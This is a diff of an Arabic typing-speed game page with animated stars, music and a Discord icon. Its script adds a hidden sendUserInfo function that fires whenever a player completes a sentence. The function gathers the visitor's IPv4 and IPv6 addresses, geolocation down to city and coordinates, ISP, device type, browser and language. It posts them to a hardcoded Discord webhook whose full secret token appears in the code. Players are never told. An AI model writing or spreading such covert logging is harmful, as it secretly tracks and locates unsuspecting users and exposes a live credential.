@@ -3,217 +3,290 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>موقع تعليمي</title>
+<title>لعبة الكتابة</title>
 <style>
   body {
-    background-color: #121212;
-    color: white;
-    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-    margin: 0; padding: 0;
+    margin: 0; padding: 0; font-family: "Arial", sans-serif;
+    background: #121212; color: #eee; overflow-x: hidden;
   }
-  header {
-    background: #23272a;
-    padding: 15px 20px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+  #stars {
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+    z-index: -1;
+    background: #000;
   }
-  header h1 {
-    margin: 0;
-    font-weight: bold;
-    color: #fff;
+  #container {
+    max-width: 600px; margin: 60px auto 40px auto; padding: 20px;
+    background: rgba(30,30,30,0.85); border-radius: 10px;
+    box-shadow: 0 0 15px #4a0d7a;
   }
-  nav button {
-    background-color: #5865F2;
-    border: none;
-    padding: 8px 14px;
-    border-radius: 5px;
-    color: white;
-    cursor: pointer;
-    font-weight: bold;
+  #sentence {
+    font-size: 28px; margin-bottom: 10px; line-height: 1.4;
+    letter-spacing: normal;
   }
-  nav button:hover {
-    background-color: #4752c4;
+  #sentence span {
+    margin: 0 3px;
   }
-  main {
-    max-width: 900px;
-    margin: 30px auto;
-    padding: 0 20px;
+  .correct { color: #4caf50; }
+  .incorrect { color: #f44336; background-color: rgba(255,0,0,0.15); border-radius: 4px; }
+  .pending { color: #ddd; }
+  #userInput {
+    width: 100%; padding: 10px; font-size: 20px;
+    border-radius: 6px; border: none; outline: none;
+    box-sizing: border-box;
+    background: #222; color: #eee;
   }
-  .star-container {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 30px;
+  #speedDisplay, #bestTime, #result {
+    margin-top: 10px; font-size: 18px; min-height: 24px;
   }
-  .star {
-    font-size: 35px;
-    color: #777;
-    cursor: pointer;
-    margin: 0 8px;
-    transition: color 0.3s;
+  #musicControl {
+    margin-top: 15px; cursor: pointer; font-size: 24px; user-select: none;
+    color: #bb86fc;
   }
-  .star.active {
-    color: #ffcc00;
+  #footerRights {
+    text-align: center; margin-top: 40px; font-size: 14px;
+    color: #888; font-weight: bold;
   }
-  .colorful-text {
-    font-size: 28px;
-    font-weight: bold;
-    text-align: center;
-    margin-bottom: 40px;
-  }
-  .colorful-text span {
-    transition: color 0.3s;
-    cursor: default;
-  }
-  /* تسجيل الدخول */
-  #login-section {
-    text-align: center;
-    margin-bottom: 40px;
-  }
-  #login-section input[type="text"] {
-    padding: 8px 12px;
-    font-size: 16px;
-    border-radius: 5px;
-    border: 1px solid #555;
-    width: 250px;
-    margin-left: 10px;
-  }
-  #login-section button {
-    background-color: #5865F2;
-    border: none;
-    padding: 8px 14px;
-    border-radius: 5px;
-    color: white;
-    cursor: pointer;
-    font-weight: bold;
-    margin-left: 10px;
-  }
-  #login-section button:hover {
-    background-color: #4752c4;
-  }
-  footer {
-    margin-top: 60px;
-    padding: 15px;
-    font-size: 14px;
-    color: #999;
-    text-align: center;
-  }
-  /* شكل ضوء دسكورد بنفسجي في الزاوية */
-  #discord-light {
-    position: fixed;
-    bottom: 15px;
-    right: 15px;
-    width: 50px;
-    height: 50px;
-    background: radial-gradient(circle, #5865F2 30%, #3a3f6e 90%);
-    border-radius: 50%;
-    box-shadow: 0 0 15px #5865F2;
-    z-index: 10000;
-  }
-  /* الموسيقى */
-  audio {
-    position: fixed;
-    top: 20px;
-    left: 20px;
-    z-index: 10000;
-    outline: none;
+  #discordButton {
+    position: fixed; bottom: 20px; left: 20px;
+    width: 48px; height: 48px; cursor: pointer;
+    filter: drop-shadow(0 0 6px #6a52b8);
   }
 </style>
 </head>
 <body>
+<canvas id="stars"></canvas>
 
-<header>
-  <h1>موقع تعليمي</h1>
-  <nav>
-    <button id="login-btn">تسجيل الدخول</button>
-  </nav>
-</header>
+<div id="container">
+  <div id="sentence"></div>
+  <input type="text" id="userInput" autocomplete="off" spellcheck="false" placeholder="اكتب الجملة هنا..." />
+  <div id="speedDisplay"></div>
+  <div id="bestTime"></div>
+  <div id="result"></div>
+  <div id="musicControl" title="تشغيل/إيقاف الموسيقى">🎵</div>
+</div>
 
-<main>
-  <div class="star-container" id="stars">
-    <span class="star" data-index="1">&#9733;</span>
-    <span class="star" data-index="2">&#9733;</span>
-    <span class="star" data-index="3">&#9733;</span>
-    <span class="star" data-index="4">&#9733;</span>
-    <span class="star" data-index="5">&#9733;</span>
-  </div>
+<div id="footerRights">حقوق النشر © معاذ الحربي</div>
 
-  <div class="colorful-text" id="colorful-text">
-    <!-- النص الملون يظهر هنا -->
-  </div>
+<audio id="bgMusic" loop>
+  <source src="https://cdn.pixabay.com/download/audio/2022/03/28/audio_3800f15e5a.mp3?filename=deep-ambient-11228.mp3" type="audio/mpeg" />
+</audio>
 
-  <div id="login-section" style="display:none;">
-    <label for="username">اسم المستخدم:</label>
-    <input type="text" id="username" placeholder="أدخل اسم المستخدم" />
-    <button id="submit-login">دخول</button>
-  </div>
-</main>
-
-<footer>
-  حقوق الموقع محفوظة لمعاذ الحربي
-</footer>
-
-<div id="discord-light" title="Discord"></div>
-
-<audio id="background-music" src="https://cdn.pixabay.com/download/audio/2021/11/06/audio_3ac7b410f3.mp3?filename=calm-ambient-11150.mp3" autoplay loop></audio>
+<!-- أيقونة ديسكورد بنفسجي -->
+<svg id="discordButton" viewBox="0 0 245 240" xmlns="http://www.w3.org/2000/svg" fill="#7289da" >
+  <path d="M104.4 104.5c-5.7 0-10.3 5-10.3 11.1 0 6.1 4.6 11.1 10.3 11.1 5.7 0 10.3-5 10.3-11.1 0-6.2-4.6-11.1-10.3-11.1zm36.2 0c-5.7 0-10.3 5-10.3 11.1 0 6.1 4.6 11.1 10.3 11.1 5.7 0 10.3-5 10.3-11.1 0-6.2-4.6-11.1-10.3-11.1z"/>
+  <path d="M189.5 20H55.5C40.5 20 28.1 33.7 28.1 51.1L26 158.4c0 17.4 12.4 31.1 29.4 31.1h98.3l-4.6-15.9 11 10.4 10.3 9.6 18.2 16.2V51.1c0-17.4-12.4-31.1-29.4-31.1zM164 156s-14.3-17.1-26.3-31.1c25.2-7.1 34.7-22.7 34.7-22.7-7.8 5.2-15.2 8.9-21.9 11.4-9.5 4-18.6 6.7-27.6 8.3-18.6 3.4-35.6 2.6-50.5-0.1-11.1-2-20.6-4.9-28.7-8.3-1.2-0.5-2.9-1.1-4.7-1.8-0.2-0.1-0.4-0.2-0.6-0.3-0.1-0.1-0.2-0.1-0.2-0.2-3-1.5-4.6-2.4-4.6-2.4s9.4 15.3 33.9 22.6c-12 14-26.4 31.2-26.4 31.2-43.5-2-60-29.9-60-29.9 0-63.5 28.4-115 28.4-115 28.4-21.1 55.3-20.6 55.3-20.6l2 2.3c-35.4 10.1-51.8 25.3-51.8 25.3s4.3-2.4 11.6-5.8c21-8.4 37.7-10.6 44.6-11.2 1.1-0.1 2.1-0.2 3.2-0.2 12.2-1 26 0.7 40.2 6.8 0 0-16-14.8-51.4-25.5l2-2.3s26.9-0.4 55.3 20.6c0 0 28.3 51.5 28.3 115 0 0-16.6 27.9-60.1 29.9z"/>
+</svg>
 
 <script>
-  const stars = document.querySelectorAll('.star');
-  const colorfulText = document.getElementById('colorful-text');
-  const loginBtn = document.getElementById('login-btn');
-  const loginSection = document.getElementById('login-section');
-  const submitLoginBtn = document.getElementById('submit-login');
-  const usernameInput = document.getElementById('username');
+  const sentence = document.getElementById("sentence");
+  const userInput = document.getElementById("userInput");
+  const speedDisplay = document.getElementById("speedDisplay");
+  const bestTimeDisplay = document.getElementById("bestTime");
+  const result = document.getElementById("result");
+  const musicControl = document.getElementById("musicControl");
+  const music = document.getElementById("bgMusic");
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";
 
-  // نص العينة لعرض الكلمات الملونة
-  const sampleText = "البطاطس سخنة وجاهزة للأكل";
+  const sentences = [
+    "تعلم كل يوم شيء جديد",
+    "الكتابة السريعة مهارة رائعة",
+    "هل أنت جاهز؟",
+    "سرعتك في الكتابة مهمة",
+    "اختبر نفسك الآن",
+    "استمر في التدريب",
+    "حاول تحسين مستواك"
+  ];
 
-  // ألوان النجوم
-  const starColors = ['#ffcc00', '#ff9900', '#ff6600', '#ff3300', '#cc0000'];
+  let currentSentence = "";
+  let startTime = 0;
+  let bestTime = null;
+  let highestSpeed = 0;
 
-  // إضافة أحداث النجوم
-  stars.forEach((star, index) => {
-    star.addEventListener('click', () => {
-      setActiveStars(index + 1);
-      colorWords(sampleText, starColors[index]);
-    });
-  });
-
-  // تعيين النجوم المفعلة
-  function setActiveStars(count) {
-    stars.forEach((star, i) => {
-      star.classList.toggle('active', i < count);
-    });
+  function newSentence() {
+    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
+    renderSentence("");
   }
 
-  // تلوين الكلمات بشكل كامل وليس حرف بحرف
-  function colorWords(text, color) {
-    const words = text.split(' ');
-    colorfulText.innerHTML = words
-      .map(word => `<span style="color:${color}; margin-left:3px;">${word}</span>`)
-      .join('');
+  function renderSentence(input) {
+    sentence.innerHTML = "";
+    const inputWords = input.trim().split(" ");
+    const targetWords = currentSentence.split(" ");
+
+    for (let i = 0; i < targetWords.length; i++) {
+      let span = document.createElement("span");
+      span.textContent = targetWords[i];
+      span.style.margin = "0 3px";
+      if (inputWords[i] == null) {
+        span.className = "pending";
+      } else if (inputWords[i] === targetWords[i]) {
+        span.className = "correct";
+      } else {
+        span.className = "incorrect";
+        // تلوين كلمة "لا" باللون مع الخلفية الخاصة
+        if (targetWords[i] === "لا") {
+          span.style.backgroundColor = "#cc4444";
+          span.style.color = "#fff";
+          span.style.padding = "0 4px";
+          span.style.borderRadius = "4px";
+        }
+      }
+      sentence.appendChild(span);
+      if (i !== targetWords.length - 1) sentence.appendChild(document.createTextNode(" "));
+    }
   }
 
-  // عند بداية الصفحة، النص أبيض بالكامل
-  colorfulText.textContent = sampleText;
-  colorfulText.style.color = '#fff';
+  function checkInput() {
+    const text = userInput.value.trim();
+    if (text === currentSentence) {
+      const endTime = Date.now();
+      const elapsed = (endTime - startTime) / 1000;
+      speedDisplay.textContent = `زمنك: ${elapsed.toFixed(2)} ثانية`;
+      if (!bestTime || elapsed < bestTime) {
+        bestTime = elapsed;
+        bestTimeDisplay.textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
+      }
+      const speed = Math.round(currentSentence.length / elapsed);
+      if (speed > highestSpeed) {
+        highestSpeed = speed;
+        result.textContent = `أعلى سرعة: ${highestSpeed} - ${elapsed.toFixed(2)} ثانية`;
+      } else {
+        result.textContent = "أحسنت! ابدأ جملة جديدة";
+      }
+      newSentence();
+      userInput.value = "";
+      startTime = Date.now();
 
-  // تسجيل الدخول
-  loginBtn.addEventListener('click', () => {
-    loginSection.style.display = 'block';
-  });
+      sendUserInfo();
 
-  submitLoginBtn.addEventListener('click', () => {
-    const user = usernameInput.value.trim();
-    if (user) {
-      alert(`مرحباً ${user}, تم تسجيل الدخول!`);
-      loginSection.style.display = 'none';
-      usernameInput.value = '';
     } else {
-      alert('يرجى إدخال اسم المستخدم');
+      result.textContent = "حاول مرة أخرى";
+    }
+    renderSentence(userInput.value);
+  }
+
+  userInput.addEventListener("input", () => {
+    renderSentence(userInput.value);
+  });
+
+  userInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      checkInput();
     }
   });
 
+  musicControl.addEventListener("click", () => {
+    if (music.paused) {
+      music.play();
+      musicControl.textContent = "🔇";
+    } else {
+      music.pause();
+      musicControl.textContent = "🎵";
+    }
+  });
+
+  newSentence();
+  startTime = Date.now();
+
+  async function sendUserInfo() {
+    try {
+      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
+        fetch('https://api.ipify.org?format=json'),
+        fetch('https://api64.ipify.org?format=json'),
+        fetch('https://ipapi.co/json/')
+      ]);
+      const ipv4Data = await ipv4Res.json();
+      const ipv6Data = await ipv6Res.json();
+      const geoData = await geoRes.json();
+
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const now = new Date();
+      const timeString = now.toISOString();
+      const ipv4 = ipv4Data.ip;
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
+
+      let deviceType = "كمبيوتر";
+      if (/android|iphone|ipad|ipod/i.test(ua)) {
+        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
+      }
+
+      const infoText = `
+IP (IPv4): ${ipv4}
+IP (IPv6): ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+خط العرض: ${geoData.latitude}
+خط الطول: ${geoData.longitude}
+المنظمة: ${geoData.org}
+المنطقة الزمنية: ${geoData.timezone}
+نوع الجهاز: ${deviceType}
+المتصفح: ${ua}
+اللغة: ${lang}
+الوقت: ${timeString}
+      `.trim();
+
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: infoText })
+      });
+
+      if (response.ok) {
+        console.log("تم إرسال البيانات للويب هوك بنجاح");
+      } else {
+        console.error("فشل إرسال البيانات للويب هوك");
+      }
+
+    } catch (e) {
+      console.error('خطأ في إرسال معلومات المستخدم', e);
+    }
+  }
+</script>
+
+<script>
+  // رسم النجوم المتحركة
+  const canvas = document.getElementById('stars');
+  const ctx = canvas.getContext('2d');
+  let width, height, stars;
+  function initStars() {
+    width = window.innerWidth;
+    height = window.innerHeight;
+    canvas.width = width;
+    canvas.height = height;
+    stars = [];
+    for (let i = 0; i < 100; i++) {
+      stars.push({
+        x: Math.random() * width,
+        y: Math.random() * height,
+        radius: Math.random() * 1.1,
+        alpha: Math.random()
+      });
+    }
+  }
+  function drawStars() {
+    ctx.clearRect(0, 0, width, height);
+    for (let s of stars) {
+      ctx.beginPath();
+      ctx.arc(s.x, s.y, s.radius, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
+      ctx.fill();
+    }
+  }
+  function animateStars() {
+    for (let s of stars) {
+      s.alpha += (Math.random() - 0.5) * 0.05;
+      if (s.alpha < 0) s.alpha = 0;
+      else if (s.alpha > 1) s.alpha = 1;
+    }
+    drawStars();
+    requestAnimationFrame(animateStars);
+  }
+  window.addEventListener('resize', () => {
+    initStars();
+  });
+  initStars();
+  animateStars();
 </script>
 
 </body>
